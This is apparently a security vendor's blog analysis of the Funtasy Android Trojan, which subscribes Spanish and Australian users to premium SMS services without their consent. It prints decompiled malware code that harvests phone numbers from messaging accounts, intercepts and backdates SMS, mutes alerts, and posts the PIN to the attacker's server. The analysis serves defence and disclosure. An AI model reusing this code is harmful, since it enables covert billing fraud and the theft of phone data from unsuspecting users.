@@ -1,0 +1,367 @@
+Funtasy Trojan Targets Spanish Android Users with Sneaky SMS Charges
+
+Summary
+
+A new Android Trojan, named Funtasy, began targeting Spanish Android users in mid-April.
+Users have downloaded 18 different variants of Funtasy between 13,500 and 67,000 times from the Google Play store.
+Funtasy currently targets users of multiple Spanish mobile networks, and one Australian mobile network.
+Funtasy subscribes victim’s phones to premium SMS services which cost up to 30 euros per month, while hiding the evidence of the subscription.
+
+Let the Funtasy Begin
+
+Palo Alto Networks WildFire detected a new Android Trojan on May 7th, 2014 when a customer using our enterprise security platform downloaded the malicious application from the Google Play store. We’ve named the malware family Funtasy, based on the domain it uses for registering compromised phones to the premium SMS service. The first version of Funtasy we detected is a fake television remote control application.
+
+Figure 1: Funtasy Trojan Disguised as TV Remote Control App.
+A developer using the ID “fun app” published the Trojan, and the remote control application they uploaded on April 21 is their most successful app so far, with between 10,000 and 50,000 downloads on the play store. Based on the reviews, the application does not function very well as a remote, but in reality it doesn’t contain remote control capability. There’s no mention of a premium SMS service in the description, but a review of the permissions reveals that the program will have complete access to SMS messages.
+
+Figure 2: Remote control app requests complete control over your SMS messages.
+After the user installs the remote application and opens it, they are presented with a terms of service screen. This is the user’s only chance to realize that opening this application is going to cost them dearly.
+
+Figure 3: Remote control app terms of service.
+If you can’t read the fine print, I don’t blame you. Here’s the text decoded from the application’s source code.
+Servicio de suscripción para usuarios Movistar, Vodafone, Orange, Yoigo, R y Simyo para mayores de edad o menores con capacidad legal para contratar, prestados por (FUNTASY MOBILE S.L., operador titular ARGATEL SOLUTIONS SL, n. atención al cliente 902 303 803 ó inf@argatel.com, apartado de correos 167, 17001 Girona. Coste por SMS recibido 1.46 euros/sms (IVA incluido) más el coste de navegación WAP, que dependerá del operador que tenga contratado. Máximo 10 sms/semana. El límite máximo de facturación del servicio puede variar en función de tu operador (18 a 30 euros/mes). Baja automática para cancelar el servicio: envía BAJA al 797977.
+This message is pretty straightforward, assuming the user actually reads it. It explains that by opening the application the reader agrees to receive up to 10 SMS messages a week at a cost of 1.46 euros each. The maximum cost per month should between 18 and 30 euros per month. If the user would like to unsubscribe they can text “BAJA” to 797977. Any user who reads this message and understands it is unlikely to agree, but Funtasy does not even wait for their agreement.
+While the terms page is on the screen, in the background the Trojan checks to see if the phone is attached to a network with one of the following mobile network codes (MNC):
+
+21401: Vodafone Spain
+21403: France Telecom España SA
+21404: Xfera Moviles SA
+21406: Vodafone Spain
+21407: Telefónica Móviles España
+21416: Telecable de Asturias S.A.U.
+21417: R Cable y Telecomunicaciones Galicia S.A.
+21418: Cableuropa S.A.U.
+21419: E-PLUS Moviles Virtuales España S.L.U.
+21421: Jazz Telecom S.A.U.
+50503: Vodafone Hutchison Australia Proprietary Limited
+
+Each of these networks is Spanish, except for a single Australian network. This data, along with an encoded version of the Terms of Service are stored as static strings in the Android package file.
+Constants.java
+
+
+
+
+package com.lasmejoresapps.tvremotecontrol;
+
+public class Constants {
+    public static final String AUSTRALIA_COUNTRY_CODE = "505";
+    public static final String GOSMSPRO = "com.jb.gosms";
+    public static final String HANDCENTSMS = "com.handcent.nextsms";
+    public static final String HANGOUTS = "com.google.android.talk";
+    public static final String JAZZTEL_OPERATOR = "JAZZTEL";
+    public static final String JAZZTEL_OPERATOR_CODE = "21421";
+    public static final String MIO_OPERATOR_CODE = "50503";
+    public static final String MOVISTAR_OPERATOR = "MOVISTAR";
+    public static final String MOVISTAR_OPERATOR_CODE = "21407";
+    public static final String MOVISTAR_OPERATOR_CODE_PHP = "364";
+    public static final String ONO_OPERATOR_CODE = "21418";
+    public static final String ORANGE_OPERATOR = "ORANGE";
+    public static final String ORANGE_OPERATOR_CODE = "21403";
+    public static final String ORANGE_OPERATOR_CODE_PHP = "363";
+    public static final String ORIGIN_SMS = "Nzk3OTc3";
+    public static final String PEPEPHONE_OPERATOR_CODE = "21406";
+    public static final String R_OPERATOR_CODE = "21417";
+    public static final String R_OPERATOR_CODE_PHP = "368";
+    public static final String SECRET_FILE = "configuration_2";
+    public static final String SIMYO_OPERATOR = "SIMYO";
+    public static final String SIMYO_OPERATOR_CODE = "21419";
+    public static final String SIMYO_OPERATOR_CODE_PHP = "367";
+    public static final String SPAIN_COUNTRY_CODE = "214";
+    public static final String TELECABLE_OPERATOR_CODE = "21416";
+    public static final String TELECABLE_OPERATOR_CODE_PHP = "369";
+    public static final String TELEGRAM1 = "org.telegram.messenger.account";
+    public static final String TELEGRAM2 = "org.telegram.account";
+    public static final String TERMS = "U2VydmljaW8gZGUgc3VzY3JpcGNpw7NuIHBhcmEgdXN1YXJpb3MgTW92aXN0YXIsIFZvZGFmb25lLCBPcmFuZ2UsIFlvaWdvLCBSIHkgU2lteW8gcGFyYSBtYXlvcmVzIGRlIGVkYWQgbyBtZW5vcmVzIGNvbiBjYXBhY2lkYWQgbGVnYWwgcGFyYSBjb250cmF0YXIsIHByZXN0YWRvcyBwb3IgKEZVTlRBU1kgTU9CSUxFIFMuTC4sIG9wZXJhZG9yIHRpdHVsYXIgQVJHQVRFTCBTT0xVVElPTlMgU0wsIG4uIGF0ZW5jacOzbiBhbCBjbGllbnRlIDkwMiAzMDMgODAzIMOzIGluZkBhcmdhdGVsLmNvbSwgYXBhcnRhZG8gZGUgY29ycmVvcyAxNjcsIDE3MDAxIEdpcm9uYS4gQ29zdGUgcG9yIFNNUyByZWNpYmlkbyAxLjQ2IGV1cm9zL3NtcyAoSVZBIGluY2x1aWRvKSBtw6FzIGVsIGNvc3RlIGRlIG5hdmVnYWNpw7NuIFdBUCwgcXVlIGRlcGVuZGVyw6EgZGVsIG9wZXJhZG9yIHF1ZSB0ZW5nYSBjb250cmF0YWRvLiBNw6F4aW1vIDEwIHNtcy9zZW1hbmEuIEVsIGzDrW1pdGUgbcOheGltbyBkZSBmYWN0dXJhY2nDs24gZGVsIHNlcnZpY2lvIHB1ZWRlIHZhcmlhciBlbiBmdW5jacOzbiBkZSB0dSBvcGVyYWRvciAoMTggYSAzMCBldXJvcy9tZXMpLiBCYWphIGF1dG9tw6F0aWNhIHBhcmEgY2FuY2VsYXIgZWwgc2VydmljaW86IGVudsOtYSBCQUpBIGFsIDc5Nzk3Ny4=";
+    public static final String TEXTSECURE = "org.thoughtcrime.securesms";
+    public static final String URL = "aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw";
+    public static final String VODAFONE_OPERATOR = "VODAFONE ES";
+    public static final String VODAFONE_OPERATOR_CODE = "21401";
+    public static final String VODAFONE_OPERATOR_CODE_PHP = "365";
+    public static final String WHATSAPP = "com.whatsapp";
+    public static final String YOIGO_OPERATOR = "YOIGO";
+    public static final String YOIGO_OPERATOR_CODE = "21404";
+    public static final String YOIGO_OPERATOR_CODE_PHP = "55";
+
+    public Constants() {
+        super();
+    }
+}
+
+
+
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445
+
+package com.lasmejoresapps.tvremotecontrol; public class Constants {    public static final String AUSTRALIA_COUNTRY_CODE = "505";    public static final String GOSMSPRO = "com.jb.gosms";    public static final String HANDCENTSMS = "com.handcent.nextsms";    public static final String HANGOUTS = "com.google.android.talk";    public static final String JAZZTEL_OPERATOR = "JAZZTEL";    public static final String JAZZTEL_OPERATOR_CODE = "21421";    public static final String MIO_OPERATOR_CODE = "50503";    public static final String MOVISTAR_OPERATOR = "MOVISTAR";    public static final String MOVISTAR_OPERATOR_CODE = "21407";    public static final String MOVISTAR_OPERATOR_CODE_PHP = "364";    public static final String ONO_OPERATOR_CODE = "21418";    public static final String ORANGE_OPERATOR = "ORANGE";    public static final String ORANGE_OPERATOR_CODE = "21403";    public static final String ORANGE_OPERATOR_CODE_PHP = "363";    public static final String ORIGIN_SMS = "Nzk3OTc3";    public static final String PEPEPHONE_OPERATOR_CODE = "21406";    public static final String R_OPERATOR_CODE = "21417";    public static final String R_OPERATOR_CODE_PHP = "368";    public static final String SECRET_FILE = "configuration_2";    public static final String SIMYO_OPERATOR = "SIMYO";    public static final String SIMYO_OPERATOR_CODE = "21419";    public static final String SIMYO_OPERATOR_CODE_PHP = "367";    public static final String SPAIN_COUNTRY_CODE = "214";    public static final String TELECABLE_OPERATOR_CODE = "21416";    public static final String TELECABLE_OPERATOR_CODE_PHP = "369";    public static final String TELEGRAM1 = "org.telegram.messenger.account";    public static final String TELEGRAM2 = "org.telegram.account";    public static final String TERMS = "U2VydmljaW8gZGUgc3VzY3JpcGNpw7NuIHBhcmEgdXN1YXJpb3MgTW92aXN0YXIsIFZvZGFmb25lLCBPcmFuZ2UsIFlvaWdvLCBSIHkgU2lteW8gcGFyYSBtYXlvcmVzIGRlIGVkYWQgbyBtZW5vcmVzIGNvbiBjYXBhY2lkYWQgbGVnYWwgcGFyYSBjb250cmF0YXIsIHByZXN0YWRvcyBwb3IgKEZVTlRBU1kgTU9CSUxFIFMuTC4sIG9wZXJhZG9yIHRpdHVsYXIgQVJHQVRFTCBTT0xVVElPTlMgU0wsIG4uIGF0ZW5jacOzbiBhbCBjbGllbnRlIDkwMiAzMDMgODAzIMOzIGluZkBhcmdhdGVsLmNvbSwgYXBhcnRhZG8gZGUgY29ycmVvcyAxNjcsIDE3MDAxIEdpcm9uYS4gQ29zdGUgcG9yIFNNUyByZWNpYmlkbyAxLjQ2IGV1cm9zL3NtcyAoSVZBIGluY2x1aWRvKSBtw6FzIGVsIGNvc3RlIGRlIG5hdmVnYWNpw7NuIFdBUCwgcXVlIGRlcGVuZGVyw6EgZGVsIG9wZXJhZG9yIHF1ZSB0ZW5nYSBjb250cmF0YWRvLiBNw6F4aW1vIDEwIHNtcy9zZW1hbmEuIEVsIGzDrW1pdGUgbcOheGltbyBkZSBmYWN0dXJhY2nDs24gZGVsIHNlcnZpY2lvIHB1ZWRlIHZhcmlhciBlbiBmdW5jacOzbiBkZSB0dSBvcGVyYWRvciAoMTggYSAzMCBldXJvcy9tZXMpLiBCYWphIGF1dG9tw6F0aWNhIHBhcmEgY2FuY2VsYXIgZWwgc2VydmljaW86IGVudsOtYSBCQUpBIGFsIDc5Nzk3Ny4=";    public static final String TEXTSECURE = "org.thoughtcrime.securesms";    public static final String URL = "aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw";    public static final String VODAFONE_OPERATOR = "VODAFONE ES";    public static final String VODAFONE_OPERATOR_CODE = "21401";    public static final String VODAFONE_OPERATOR_CODE_PHP = "365";    public static final String WHATSAPP = "com.whatsapp";    public static final String YOIGO_OPERATOR = "YOIGO";    public static final String YOIGO_OPERATOR_CODE = "21404";    public static final String YOIGO_OPERATOR_CODE_PHP = "55";     public Constants() {        super();    }}
+
+
+
+
+
+After determining the phone is on one of the correct networks, the malware searches for the phone’s mobile number. It does this in three ways:
+
+Invoking the TelephonyManager’s getLine1Number() method.
+Traversing the phones call logs and parsing the phones outgoing number.
+Searching the phone for account numbers associated with messaging apps WhatsApp and Telegram.  If a user has registered with one of these applications using a number not associated with the phone, that number will be used by Funtasy.
+
+Util.java
+
+
+
+
+private static String getPhoneNumberFromAccounts(Context context) throws Exception {
+        String v2;
+        int v8;
+        Account[] v1;
+        Log.i("Util", "begin method getPhoneNumberFromAccounts");
+        String v7 = null;
+        try {
+            v1 = AccountManager.get(context).getAccounts();
+            String v5 = "telegram";
+            int v9 = v1.length;
+            v8 = 0;
+        }
+        catch(Exception v6) {
+            goto label_46;
+        }
+
+        while(true) {
+            if(v8 >= v9) {
+                goto label_10;
+            }
+
+            try {
+                Account v0 = v1[v8];
+                v2 = v0.name;
+                String v3 = v0.type;
+                if(!v3.equals("com.whatsapp")) {
+                    if(!v3.equals("org.telegram.messenger.account") && !v3.equals("org.telegram.account")
+                             && !v3.contains(((CharSequence)v5))) {
+                        goto label_37;
+                    }
+
+                    break;
+                }
+                else if(!v2.equals("WhatsApp") && (Util.isANumber(v2))) {
+                    v7 = Util.formatPhoneNumber(v2);
+                    goto label_10;
+                }
+            }
+            catch(Exception v6) {
+                goto label_46;
+            }
+
+        label_37:
+            ++v8;
+        }
+
+        try {
+            v7 = Util.formatPhoneNumber(v2);
+        }
+        catch(Exception v6) {
+        label_46:
+            Log.e("Util", "error method getPhoneNumberFromAccounts: " + v6.getMessage());
+            v6.printStackTrace();
+        }
+
+    label_10:
+        Log.i("Util", "end method getPhoneNumberFromAccounts");
+        return v7;
+    }
+
+
+
+
+1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859
+
+private static String getPhoneNumberFromAccounts(Context context) throws Exception {        String v2;        int v8;        Account[] v1;        Log.i("Util", "begin method getPhoneNumberFromAccounts");        String v7 = null;        try {            v1 = AccountManager.get(context).getAccounts();            String v5 = "telegram";            int v9 = v1.length;            v8 = 0;        }        catch(Exception v6) {            goto label_46;        }         while(true) {            if(v8 >= v9) {                goto label_10;            }             try {                Account v0 = v1[v8];                v2 = v0.name;                String v3 = v0.type;                if(!v3.equals("com.whatsapp")) {                    if(!v3.equals("org.telegram.messenger.account") && !v3.equals("org.telegram.account")                             && !v3.contains(((CharSequence)v5))) {                        goto label_37;                    }                     break;                }                else if(!v2.equals("WhatsApp") && (Util.isANumber(v2))) {                    v7 = Util.formatPhoneNumber(v2);                    goto label_10;                }            }            catch(Exception v6) {                goto label_46;            }         label_37:            ++v8;        }         try {            v7 = Util.formatPhoneNumber(v2);        }        catch(Exception v6) {        label_46:            Log.e("Util", "error method getPhoneNumberFromAccounts: " + v6.getMessage());            v6.printStackTrace();        }     label_10:        Log.i("Util", "end method getPhoneNumberFromAccounts");        return v7;    }
+
+
+
+
+
+With the phone’s number captured, Funtasy then registers the mobile account with a premium SMS service by sending an HTTP POST request to the following URL.
+
+http://funtasymobile.com/alertas_alta_web.php
+
+The request is made without the users knowledge, they have no choice to select a number. Of course, premium SMS services require that the user confirm that they want to sign up by sending incoming SMS message containing a PIN.  Funtasy  intercepts this message, parses out the PIN and sends it back to the registration server, completing the enrollment process.
+IncomingSms.java
+
+
+
+
+package com.lasmejoresapps.tvremotecontrol;
+
+import android.content.BroadcastReceiver;
+import android.content.ContentValues;
+import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import android.telephony.SmsMessage;
+import android.util.Log;
+
+public class IncomingSms extends BroadcastReceiver {
+    private static final String TAG = "IncomingSms";
+    private String operator;
+    private String paso;
+    private String phoneNumber;
+    private String pin;
+    private String url;
+
+    public IncomingSms() {
+        super();
+    }
+
+    private void changeSms(Context context, Intent intent) throws Exception {
+        int v5;
+        long v2;
+        String v0;
+        String v8;
+        Log.i("IncomingSms", "begin method changeSms");
+        try {
+            Bundle v1 = intent.getExtras();
+            v8 = "";
+            v0 = "";
+            v2 = 0;
+            if(v1 == null) {
+                goto label_38;
+            }
+
+            Object v7 = v1.get("pdus");
+            SmsMessage[] v6 = new SmsMessage[v7.length];
+            v5 = 0;
+            while(true) {
+            label_14:
+                if(v5 >= v6.length) {
+                    goto label_16;
+                }
+
+                v6[v5] = SmsMessage.createFromPdu(v7[v5]);
+                v8 = String.valueOf(v8) + v6[v5].getOriginatingAddress();
+                v0 = String.valueOf(v0) + v6[v5].getMessageBody();
+                v2 = v6[v5].getTimestampMillis();
+                if(v0 != null && !v0.equals("") && (v8.equals(Util.decode("Nzk3OTc3")))) {
+                    this.pin = this.getPinFromSms(v0);
+                }
+
+                break;
+            }
+        }
+        catch(Exception v4) {
+            goto label_78;
+        }
+
+        ++v5;
+        goto label_14;
+        try {
+        label_16:
+            this.stopSms();
+            ContentValues v9 = new ContentValues();
+            v9.put("address", v8);
+            v9.put("body", v0);
+            v9.put("read", Integer.valueOf(1));
+            v9.put("date", Double.valueOf((((double)v2)) - 1296000000 + 15240000));
+            context.getContentResolver().insert(Uri.parse("content://sms/inbox"), v9);
+        }
+        catch(Exception v4) {
+        label_78:
+            Log.e("IncomingSms", "error method changeSms: " + v4.getMessage());
+            v4.printStackTrace();
+        }
+
+    label_38:
+        Log.i("IncomingSms", "end method changeSms");
+    }
+
+    private String getPinFromSms(String message) throws Exception {
+        String v1;
+        Log.i("IncomingSms", "begin method getPinFromSms");
+        try {
+            v1 = Util.extractNumber(message);
+        }
+        catch(Exception v0) {
+            Log.i("IncomingSms", "error method getPinFromSms: " + v0.getMessage());
+            v0.printStackTrace();
+        }
+
+        Log.i("IncomingSms", "end method getPinFromSms");
+        return v1;
+    }
+
+    private void muteNotification(Context context) throws Exception {
+        Log.i("IncomingSms", "begin method muteNotification");
+        try {
+            context.getSystemService("audio").setStreamMute(5, true);
+        }
+        catch(Exception v1) {
+            Log.e("IncomingSms", "error method muteNotification: " + v1.getMessage());
+            v1.printStackTrace();
+        }
+
+        Log.i("IncomingSms", "end method muteNotification");
+    }
+
+    public void onReceive(Context context, Intent intent) {
+        Log.i("IncomingSms", "begin method onReceive");
+        try {
+            this.muteNotification(context);
+            this.changeSms(context, intent);
+            Context v1 = context.getApplicationContext();
+            this.phoneNumber = ((Request)v1).getPhoneNumber();
+            this.paso = "3";
+            this.operator = ((Request)v1).getOperator();
+            ((Request)v1).setPin(this.pin);
+            new SendPostReqAsync().execute(new String[]{Util.decode("aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw"), 
+                    this.phoneNumber, this.operator, this.paso, this.pin});
+        }
+        catch(Exception v0) {
+            Log.e("IncomingSms", "error method onReceive: " + v0.getMessage());
+            v0.printStackTrace();
+        }
+
+        Log.i("IncomingSms", "end method onReceive");
+    }
+
+    private void stopSms() throws Exception {
+        Log.i("IncomingSms", "begin method stopSms");
+        try {
+            this.abortBroadcast();
+        }
+        catch(Exception v0) {
+            Log.e("IncomingSms", "error method stopSms: " + v0.getMessage());
+            v0.printStackTrace();
+        }
+
+        Log.i("IncomingSms", "end method stopSms");
+    }
+}
+
+
+
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146
+
+package com.lasmejoresapps.tvremotecontrol; import android.content.BroadcastReceiver;import android.content.ContentValues;import android.content.Context;import android.content.Intent;import android.net.Uri;import android.os.Bundle;import android.telephony.SmsMessage;import android.util.Log; public class IncomingSms extends BroadcastReceiver {    private static final String TAG = "IncomingSms";    private String operator;    private String paso;    private String phoneNumber;    private String pin;    private String url;     public IncomingSms() {        super();    }     private void changeSms(Context context, Intent intent) throws Exception {        int v5;        long v2;        String v0;        String v8;        Log.i("IncomingSms", "begin method changeSms");        try {            Bundle v1 = intent.getExtras();            v8 = "";            v0 = "";            v2 = 0;            if(v1 == null) {                goto label_38;            }             Object v7 = v1.get("pdus");            SmsMessage[] v6 = new SmsMessage[v7.length];            v5 = 0;            while(true) {            label_14:                if(v5 >= v6.length) {                    goto label_16;                }                 v6[v5] = SmsMessage.createFromPdu(v7[v5]);                v8 = String.valueOf(v8) + v6[v5].getOriginatingAddress();                v0 = String.valueOf(v0) + v6[v5].getMessageBody();                v2 = v6[v5].getTimestampMillis();                if(v0 != null && !v0.equals("") && (v8.equals(Util.decode("Nzk3OTc3")))) {                    this.pin = this.getPinFromSms(v0);                }                 break;            }        }        catch(Exception v4) {            goto label_78;        }         ++v5;        goto label_14;        try {        label_16:            this.stopSms();            ContentValues v9 = new ContentValues();            v9.put("address", v8);            v9.put("body", v0);            v9.put("read", Integer.valueOf(1));            v9.put("date", Double.valueOf((((double)v2)) - 1296000000 + 15240000));            context.getContentResolver().insert(Uri.parse("content://sms/inbox"), v9);        }        catch(Exception v4) {        label_78:            Log.e("IncomingSms", "error method changeSms: " + v4.getMessage());            v4.printStackTrace();        }     label_38:        Log.i("IncomingSms", "end method changeSms");    }     private String getPinFromSms(String message) throws Exception {        String v1;        Log.i("IncomingSms", "begin method getPinFromSms");        try {            v1 = Util.extractNumber(message);        }        catch(Exception v0) {            Log.i("IncomingSms", "error method getPinFromSms: " + v0.getMessage());            v0.printStackTrace();        }         Log.i("IncomingSms", "end method getPinFromSms");        return v1;    }     private void muteNotification(Context context) throws Exception {        Log.i("IncomingSms", "begin method muteNotification");        try {            context.getSystemService("audio").setStreamMute(5, true);        }        catch(Exception v1) {            Log.e("IncomingSms", "error method muteNotification: " + v1.getMessage());            v1.printStackTrace();        }         Log.i("IncomingSms", "end method muteNotification");    }     public void onReceive(Context context, Intent intent) {        Log.i("IncomingSms", "begin method onReceive");        try {            this.muteNotification(context);            this.changeSms(context, intent);            Context v1 = context.getApplicationContext();            this.phoneNumber = ((Request)v1).getPhoneNumber();            this.paso = "3";            this.operator = ((Request)v1).getOperator();            ((Request)v1).setPin(this.pin);            new SendPostReqAsync().execute(new String[]{Util.decode("aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw"),                     this.phoneNumber, this.operator, this.paso, this.pin});        }        catch(Exception v0) {            Log.e("IncomingSms", "error method onReceive: " + v0.getMessage());            v0.printStackTrace();        }         Log.i("IncomingSms", "end method onReceive");    }     private void stopSms() throws Exception {        Log.i("IncomingSms", "begin method stopSms");        try {            this.abortBroadcast();        }        catch(Exception v0) {            Log.e("IncomingSms", "error method stopSms: " + v0.getMessage());            v0.printStackTrace();        }         Log.i("IncomingSms", "end method stopSms");    }}
+
+
+
+
+
+Of course, once users begin receiving the SMS messages, they are likely to unsubscribe from the service they never really wanted. To prevent this, Funtasy blocks the incoming messages before they are displayed to the user and modifies the time stamp on each message to make them appear to have been received 15 days earlier. This moves it to the back of the inbox there the victim is unlikely to ever see it.  Funtasy does this even when the victim uses alternative SMS managers, like Google Hangouts or GO SMS Pro.
+Oscar Sanchez
+After evaluating the remote control app and finding malicious behavior, we decided to evaluate all of the other applications published by “fun app”, and found 12 more which all contains the exact same behavior.
+
+Figure 4: Additional “fun app” applications, all contain the Funtasy Trojan.
+Each of these applications is designed to appear like a legitimate application already in the app store. To raise the ranking of these apps, the author appears to have given many of them five-star ratings. Unfortunately for them, this gave us additional insight into their operation.
+To rate and comment on applications, users must have a Google account. One account using the name “Oscar Sanchez” gave high ratings and positive comments to many of the “fun app” applications. He also rated apps made by two additional publishers with the names “MilApps101” and “Milapps102.” Between the two of these developers they have produced five applications, and we’ve found that every one of them contains the Funtasy Trojan. While the name “Oscar Sanchez” may be a pseudonym, Whois data indicates it was also used to register the domain hosting the Funtasy Mobile premium SMS service.
+In total we’ve found 18 different applications in the Google Play store that contain the Funtasy Trojan. Each of these files also has the same internal class structure, which is represented by the tree structure below.
+
+Figure 5: Funtasy internal class structure.
+Researchers interested in investigating them further can find more information in the table below.
+Using this Trojan the attacker could be generating up to 30 euros per month for over 67,000 infected mobile phones. That adds up to 2 million euros per month, but the actual number is likely much lower. Many of the users who downloaded the tool may not be using one of the targeted Spanish or Australian networks.
+
+Figure 6: List of Android APK files infected with Funtasy Trojan
+Users who want to defend against the Funtasy Trojan should not rely on traditional antivirus programs, as they do not currently detect this threat. Common sense is the best defense against these types of abusive programs. While many users breeze past the list of permissions required when installing new apps, readers of this blog should ask themselves, “Does my electronic bible need to read my SMS messages?”
+ 
+
